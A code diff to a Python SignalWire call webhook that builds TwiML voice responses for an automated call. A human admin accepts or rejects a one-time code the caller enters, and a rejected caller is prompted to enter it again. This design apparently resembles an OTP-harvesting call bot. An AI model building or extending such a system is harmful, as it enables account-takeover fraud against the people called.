@@ -466,9 +466,13 @@ async def signalwire_wait(call_id: str):
         if admin_decision == 'accept':
             # Play accepted message
             accepted_message = call_data.get('accepted_message', 'Thank you')
+            
+            # Generate voice element for Accepted message
+            voice_element_accepted = await generate_voice_element(accepted_message, voice)
+            
             twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
 <Response>
-    <Say voice="{voice}">{accepted_message}</Say>
+    {voice_element_accepted}
     <Hangup/>
 </Response>'''
             return Response(content=twiml, media_type="application/xml")
@@ -484,16 +488,19 @@ async def signalwire_wait(call_id: str):
             # Redirect ke gather OTP dengan rejected message
             gather_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/retry-otp"
             
+            # Generate voice element for Rejected message
+            voice_element_rejected = await generate_voice_element(rejected_message, voice)
+            
             # Repeat rejected message 2x lalu gather
             twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
 <Response>
-    <Say voice="{voice}">{rejected_message}</Say>
+    {voice_element_rejected}
     <Pause length="2"/>
-    <Say voice="{voice}">{rejected_message}</Say>
+    {voice_element_rejected}
     <Gather numDigits="{digits_required}" action="{gather_url}" method="POST" timeout="20">
         <Pause length="1"/>
     </Gather>
-    <Say voice="{voice}">We did not receive the code. Goodbye.</Say>
+    <Say voice="Aurora">We did not receive the code. Goodbye.</Say>
     <Hangup/>
 </Response>'''
             return Response(content=twiml, media_type="application/xml")
